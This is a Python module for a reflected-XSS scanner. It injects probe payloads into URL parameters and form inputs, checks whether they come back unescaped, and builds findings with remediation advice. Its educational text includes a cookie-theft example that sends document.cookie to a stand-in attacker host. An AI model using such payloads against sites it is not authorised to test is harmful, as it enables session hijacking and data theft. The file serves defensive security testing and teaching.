"""
XSS (Cross-Site Scripting) Scanner Module
Detects reflected XSS vulnerabilities by:
  1. Injecting XSS payloads into URL parameters and form inputs
  2. Checking if the payload appears unescaped in the response HTML
"""

import json
import time
import logging
import html as html_module
from urllib.parse import urlencode, urlparse, urlunparse

import requests
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)


class XSSScanner:
    """
    Reflected XSS detection engine.
    Tests URL query parameters and HTML form inputs.
    """

    def __init__(self, session, payloads_file, timeout=10, delay=0.5):
        self.session  = session
        self.timeout  = timeout
        self.delay    = delay
        self.findings = []
        self.logs     = []

        self.payloads = self._load_payloads(payloads_file)

    # ------------------------------------------------------------------
    # Public interface
    # ------------------------------------------------------------------

    def scan_page(self, page_info):
        """
        Scan a single page for reflected XSS.
        Returns list of new finding dicts.
        """
        url    = page_info['url']
        params = page_info.get('params', {})
        forms  = page_info.get('forms', [])

        new_findings = []

        # Test URL parameters
        if params:
            self._log(f"Testing URL params on: {url}")
            for param_name in params:
                for payload_entry in self.payloads:
                    finding = self._test_url_param(url, params, param_name, payload_entry)
                    if finding:
                        new_findings.append(finding)
                        self.findings.append(finding)
                        break  # one confirmed finding per parameter
                time.sleep(self.delay)

        # Test HTML forms
        for form in forms:
            self._log(f"Testing form (XSS) at: {form['action']}")
            for input_field in form['inputs']:
                for payload_entry in self.payloads:
                    finding = self._test_form_input(form, input_field, payload_entry)
                    if finding:
                        new_findings.append(finding)
                        self.findings.append(finding)
                        break
                time.sleep(self.delay)

        return new_findings

    # ------------------------------------------------------------------
    # URL parameter testing
    # ------------------------------------------------------------------

    def _test_url_param(self, url, params, param_name, payload_entry):
        """Inject XSS payload into a URL parameter and check response."""
        payload = payload_entry['payload']

        injected_params = dict(params)
        injected_params[param_name] = [payload]
        injected_url = self._build_url_with_params(url, injected_params)

        try:
            resp = self.session.get(injected_url, timeout=self.timeout)
        except requests.exceptions.RequestException as e:
            self._log(f"Request error: {e}", level='error')
            return None

        if self._payload_reflected(payload, resp.text):
            return self._make_finding(
                url=injected_url,
                parameter=param_name,
                payload=payload,
                context='URL parameter',
                evidence=self._extract_evidence(resp.text, payload),
                severity='medium',
            )

        return None

    # ------------------------------------------------------------------
    # Form input testing
    # ------------------------------------------------------------------

    def _test_form_input(self, form, input_field, payload_entry):
        """Inject XSS payload into a form field and check if reflected."""
        payload    = payload_entry['payload']
        action     = form['action']
        method     = form['method']
        field_name = input_field['name']

        # Build form data
        data = {}
        for inp in form['inputs']:
            data[inp['name']] = inp['value'] or 'test'
        data[field_name] = payload

        try:
            if method == 'post':
                resp = self.session.post(action, data=data, timeout=self.timeout)
            else:
                resp = self.session.get(action, params=data, timeout=self.timeout)
        except requests.exceptions.RequestException as e:
            self._log(f"Form request error: {e}", level='error')
            return None

        if self._payload_reflected(payload, resp.text):
            return self._make_finding(
                url=action,
                parameter=field_name,
                payload=payload,
                context='HTML form input',
                evidence=self._extract_evidence(resp.text, payload),
                severity='medium',
            )

        return None

    # ------------------------------------------------------------------
    # Detection helpers
    # ------------------------------------------------------------------

    def _payload_reflected(self, payload, response_body):
        """
        Check if what we injected actually came back in the page's HTML.
        A reflected payload means the server echoed our input back — if that
        input contains <script> tags, a real user's browser would execute it.
        """
        # Best case: the exact payload is in the raw HTML — most reliable signal
        if payload in response_body:
            return self._is_executable_context(payload, response_body)

        # Some servers strip quotes but keep the rest of the payload intact.
        # If the stripped version is still recognisable, that still counts.
        stripped = payload.replace('"', '').replace("'", '')
        if len(stripped) > 10 and stripped in response_body:
            return True

        return False

    def _is_executable_context(self, payload, response_body):
        """
        Not all reflections are dangerous. Here we filter out the safe ones:
          - Inside an HTML comment (<!-- ... -->) = browser won't run it
          - HTML entity-encoded (&lt;script&gt;) = browser displays it as text, won't run it
        If neither safe case applies, we assume it could execute — report it.
        """
        comment_start = response_body.find('<!--')
        comment_end   = response_body.find('-->')
        payload_pos   = response_body.find(payload)

        if (comment_start != -1 and comment_end != -1 and
                comment_start < payload_pos < comment_end):
            return False  # safely tucked inside a comment

        # html.escape() turns <script> into &lt;script&gt; — that's the safe encoding
        encoded = html_module.escape(payload)
        if encoded in response_body and payload not in response_body:
            return False  # server encoded it properly — not exploitable

        return True

    def _extract_evidence(self, body, payload):
        """Return a snippet of the response containing the reflected payload."""
        idx = body.find(payload)
        if idx == -1:
            # Try partial match
            key_part = payload[:20] if len(payload) > 20 else payload
            idx = body.find(key_part)

        if idx != -1:
            start = max(0, idx - 100)
            end   = min(len(body), idx + len(payload) + 100)
            return '...' + body[start:end].strip() + '...'

        return body[:300]

    def _build_url_with_params(self, url, params):
        parsed   = urlparse(url)
        flat     = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        new_query = urlencode(flat)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, ''))

    # ------------------------------------------------------------------
    # Finding builder
    # ------------------------------------------------------------------

    def _make_finding(self, url, parameter, payload, context, evidence, severity):
        import json as _json

        base_url = url.split('?')[0]

        edu = {
            'what': (
                "Cross-Site Scripting (XSS) lets an attacker inject JavaScript into a web page that other users will view. "
                "The browser has no way to know the script wasn't written by the site itself — so it runs it with full trust.\n\n"
                "Reflected XSS: the payload is in the URL, the server echoes it back immediately. Requires victim to click a crafted link.\n"
                "Stored XSS: the payload is saved in the database and runs for every user who views the affected page — far more dangerous."
            ),
            'attack_scenario': (
                f"We submitted this payload via {context} '{parameter}':\n"
                f"  {payload}\n\n"
                "The server returned it unescaped inside the HTML response. "
                "A real attacker would send this link to a victim:\n\n"
                f"  {base_url}?{parameter}=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n\n"
                "When the victim opens the link, the script runs in their browser — silently — "
                "and sends their session cookie to the attacker. The attacker then uses that cookie "
                "to log in as the victim without needing their password."
            ),
            'vulnerable_code': (
                "# ❌ Jinja2 — | safe disables auto-escaping, renders raw HTML tags\n"
                "{{ user_input | safe }}\n\n"
                "// ❌ JavaScript — innerHTML parses and executes HTML/JS\n"
                "document.getElementById('output').innerHTML = userInput;\n\n"
                "// ❌ React — opt-in raw HTML, no built-in sanitisation\n"
                "<div dangerouslySetInnerHTML={{__html: userInput}} />"
            ),
            'safe_code': (
                "# ✅ Jinja2 — auto-escapes < > \" ' & by default (just remove | safe)\n"
                "{{ user_input }}\n\n"
                "// ✅ JavaScript — textContent treats input as text, never HTML\n"
                "document.getElementById('output').textContent = userInput;\n\n"
                "// ✅ If you MUST insert HTML, sanitise it first:\n"
                "element.innerHTML = DOMPurify.sanitize(userInput);"
            ),
            'real_impact': (
                "XSS is behind some of the most impactful web attacks:\n\n"
                "• 2005 — Samy Worm (MySpace): a stored XSS worm added 1 million friends in 20 hours, "
                "crashing the site and leading to the author's arrest\n"
                "• 2014 — eBay: stored XSS redirected buyers to phishing sites during checkout\n"
                "• 2018 — British Airways (Magecart): XSS-based script injection stole 380,000 "
                "payment card details in real time at checkout\n\n"
                "Reflected XSS is the most common type and is the basis of nearly every "
                "session hijacking and credential phishing attack sent via malicious links."
            ),
            'fix': (
                "1. HTML-encode all output — Jinja2 auto-escapes by default, never use | safe with user data.\n\n"
                "2. Use textContent (not innerHTML) in JavaScript when inserting user-controlled text.\n\n"
                "3. Add a Content-Security-Policy header — script-src 'self' blocks injected scripts\n"
                "   even if the encoding step fails.\n\n"
                "4. Validate input on the server: reject unexpected characters, enforce length limits.\n\n"
                "5. If you must render user HTML (e.g. a comment editor), run it through DOMPurify\n"
                "   before inserting — never trust raw user HTML."
            ),
            'owasp': 'https://owasp.org/www-community/attacks/xss/',
            'cvss':  'CVSS 6.1 Medium (reflected) / 8.8 High (stored) — can hijack sessions, steal data, deface pages',
        }

        self._log(f"[XSS-{severity.upper()}] Reflected XSS in '{parameter}' at {url}")

        return {
            'vuln_type':          'xss',
            'severity':           severity,
            'title':              'Reflected Cross-Site Scripting (XSS)',
            'description':        f'Reflected XSS detected in {context} "{parameter}". The injected payload was returned in the response without proper HTML encoding.',
            'affected_url':       url,
            'affected_parameter': parameter,
            'payload_used':       payload,
            'evidence':           evidence[:1000],
            'remediation':        edu['fix'],
            'educational_info':   _json.dumps(edu),
        }

    # ------------------------------------------------------------------
    # Payload loading
    # ------------------------------------------------------------------

    def _load_payloads(self, payloads_file):
        try:
            with open(payloads_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except FileNotFoundError:
            self._log(f"Payloads file not found: {payloads_file}", level='error')
            return self._default_payloads()
        except json.JSONDecodeError as e:
            self._log(f"JSON decode error: {e}", level='error')
            return self._default_payloads()

    def _default_payloads(self):
        return [
            {'payload': '<script>alert("XSS")</script>'},
            {'payload': '"><script>alert(1)</script>'},
            {'payload': '<img src=x onerror=alert(1)>'},
            {'payload': "javascript:alert(1)"},
            {'payload': '<svg onload=alert(1)>'},
        ]

    def _log(self, message, level='info'):
        entry = f"[XSS] {message}"
        self.logs.append({'level': level, 'message': entry})
        logger.info(entry) if level == 'info' else logger.warning(entry)
